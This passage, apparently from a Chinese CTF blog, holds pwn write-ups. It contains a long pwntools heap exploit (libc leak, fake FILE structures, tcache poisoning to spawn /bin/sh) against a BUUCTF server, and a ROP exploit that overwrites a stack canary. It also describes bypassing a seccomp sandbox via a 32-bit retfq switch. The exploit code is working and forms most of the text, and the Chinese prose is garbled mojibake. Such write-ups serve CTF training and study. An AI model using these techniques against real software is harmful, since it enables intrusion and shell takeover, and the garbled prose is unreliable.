class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26218</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">offset,size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;offset: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x430</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">132</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    <span class="comment"># pay+=p64(0)+p64(0x2b61)</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x420</span>)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show()</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x61</span>-<span class="number">0x1e0c00</span></span><br><span class="line">    stderr_addr=<span class="number">0x1e15e0</span>+libc_addr</span><br><span class="line">    stderr_chain=stderr_addr+<span class="number">0x68</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">130</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x830</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">    mem_addr=u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x820</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">8</span>,p64(libc_addr+<span class="number">0x1e0c00</span>))</span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e1000</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1ed5b0</span>-<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">0x800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x830</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(mem_addr+<span class="number">0x820</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x820</span>)*<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0x830</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x20</span>)*<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    fake_io_1=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_1+=p64(mem_addr+<span class="number">0x1a00</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_1+=p64(mem_addr+<span class="number">0x1e00</span>)+p64(mem_addr+<span class="number">0x1e00</span>+<span class="number">22</span>)</span><br><span class="line">    fake_io_1+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(mem_addr+<span class="number">0x920</span>)</span><br><span class="line">    fake_io_1+=p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x1e2560</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x820</span>,<span class="built_in">len</span>(fake_io_1),fake_io_1)</span><br><span class="line"></span><br><span class="line">    fake_io_2=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(mem_addr+<span class="number">0x1a00</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(mem_addr+<span class="number">0x1e00</span>)+p64(mem_addr+<span class="number">0x1e00</span>+<span class="number">22</span>)</span><br><span class="line">    fake_io_2+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x1e2560</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x920</span>,<span class="built_in">len</span>(fake_io_2),fake_io_2)</span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">18</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    free_hook=libc_addr+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    <span class="built_in">next</span>=((mem_addr+<span class="number">0x1030</span>&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(free_hook-<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x8</span>,p64(<span class="built_in">next</span>))</span><br><span class="line">    pay=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    edit(<span class="number">0x1e00</span>,<span class="number">0x18</span>,pay)</span><br><span class="line">    free(<span class="number">0x460</span>)</span><br><span class="line">    add(<span class="number">0x420</span>)</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">1</span>)+<span class="string">&#x27;A&#x27;</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;aA&quot;</span>)</span><br><span class="line">    heap_aadr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">130</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1200</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1230</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e0ff0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1e3e78</span>-<span class="number">0x20</span>-<span class="number">3</span>))</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1631</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x651</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line"></span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(<span class="number">0x1e1960</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1620</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1c41</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xc61</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line"></span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1c30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1481</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x4a1</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^<span class="number">0x0068732f6e69622f</span></span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1470</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(mem_addr+<span class="number">0x1220</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x1220</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x1220</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x20</span>)*<span class="number">3</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">22</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">0x1830</span>)</span><br><span class="line">        edit(<span class="number">0x1830</span>,<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">0x1830</span>)</span><br><span class="line">    edit(<span class="number">0x1820</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>))</span><br><span class="line">    add(<span class="number">0xffff</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>






      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/11/MninL-CTF-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/11/MninL-CTF-pwn/" class="post-title-link" itemprop="url">MninL-CTF-pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-11 19:19:42 / ä¿®æ”¹æ—¶é—´ï¼š19:20:13" itemprop="dateCreated datePublished" datetime="2022-05-11T19:19:42+08:00">2022-05-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>![img](file:///C:\Users\å¼ é¹\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R`A.png)</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220511133825521.png" alt="image-20220511133825521"></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>ä¸€é“æœ‰ç‚¹ç‚¹éº»çƒ¦çš„scanfæ ˆæº¢å‡ºï¼Œç»™äº†ä¸¤æ¬¡ä»»æ„æ”¹å’Œä¸€æ¬¡74å­—èŠ‚çš„scanfè¾“å…¥æœºä¼šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä»»æ„æ”¹æ”¹TLSå‚¨å­˜çš„canaryçš„å€¼ï¼Œä¸è¿‡åªæœ‰åœ¨çº¿ç¨‹ä¸­æ‰canaryçš„å‚¨å­˜ä½ç½®æ‰ç¦»æ ˆå¾ˆè¿‘ï¼Œå¯ä»¥é€šè¿‡æ ˆæ”¹ï¼Œåœ¨è¿›ç¨‹ä¸­éƒ½æ˜¯å‚¨å­˜åœ¨fsæ®µï¼Œç¦»æ ˆéå¸¸è¿œå°±ä¸å¥½æ›´æ”¹äº†ï¼Œç„¶åé€šè¿‡scanfçš„æ ˆæº¢å‡ºæä¸ªoggå°±èƒ½getshelläº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_LIBRARY_PATH&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/&#x27;&#125;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10015</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x40142E</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Add new god:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;Name: &quot;</span>,content.ljust(<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Do you know who is the God of XDSEC? (*^_^*)&quot;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    edit(<span class="number">272</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">10</span>,p64(<span class="number">0x401236</span>))</span><br><span class="line">    pop_rdi=<span class="number">0x00000000004015d3</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>-<span class="number">1</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(<span class="number">0x401236</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x0000000000034580</span>)+p64(libc_base+<span class="number">0xe3b34</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn2-shellcode"><a href="#pwn2-shellcode" class="headerlink" title="pwn2 shellcode"></a>pwn2 shellcode</h2><p>ä¸€é“æœ‰æ²™ç®±çš„shellcodeé¢˜ç›®ï¼Œåˆšå¼€å§‹é¢˜ç›®å‡ºçš„æœ‰é—®é¢˜ï¼Œæ²™ç®±æ²¡æœ‰ç¦ç”¨0x40000000,æ‰€ä»¥å¯ä»¥<code>0x40000000+ç³»ç»Ÿè°ƒç”¨å·</code>ç»•è¿‡æ²™ç®±ï¼Œæœ¬åœ°æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯è¿œç¨‹ä¸€ç›´ä¸æˆåŠŸï¼Œå’Œå‡ºé¢˜äººåé¦ˆåè¯´æ˜¯é¢˜ç›®å‡ºé”™äº†ï¼Œæœ€åbanäº†0x40000000,ä½†æ˜¯æ²¡æœ‰banæ¶æ„ï¼Œæ²™ç›’å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/xidian/pwn5$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x05 0x00 0x40000000  if (A &gt; 0x40000000) goto 0007</span><br><span class="line"> 0002: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0007</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0007</span><br><span class="line"> 0004: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>æœ¬è´¨ä¸Šä»–å…è®¸<code>1 5 0 9</code>è¿™å››ä¸ªç³»ç»Ÿè°ƒç”¨å·ï¼Œåœ¨32ä½ä¸‹è°ƒç”¨å·5å¯¹åº”<code>open</code>ï¼Œè¿™æ ·orwå°±å‡‘é½äº†ï¼Œå…ˆåœ¨64ä¸‹åˆ©ç”¨mmapç”³è¯·32ä½åœ°å€çš„åœ°æ®µç©ºé—´ï¼Œç„¶åä½¿ç”¨<code>retfq</code>è½¬åˆ°32ä½ï¼Œè°ƒç”¨openåè°ƒç”¨<code>retfq</code>è¿”å›64ä½ï¼Œæ³¨æ„32ä½æ²¡æœ‰retfqè¿™ä¸ªæŒ‡ä»¤æ‰€ä»¥å¡«çš„æ˜¯64ä½çš„ï¼Œè¿˜æœ‰ç¬¬äºŒä¸ªretfqåé¢å¿…é¡»å¾—è¿˜æœ‰æŒ‡ä»¤æ‰èƒ½æ‰§è¡ŒæˆåŠŸï¼Œä¸ç„¶å°±ä¼šå‡ºé”™ï¼Œæœ€ååœ¨64ä½ä¸‹è°ƒç”¨rwå¾—åˆ°flag</p>
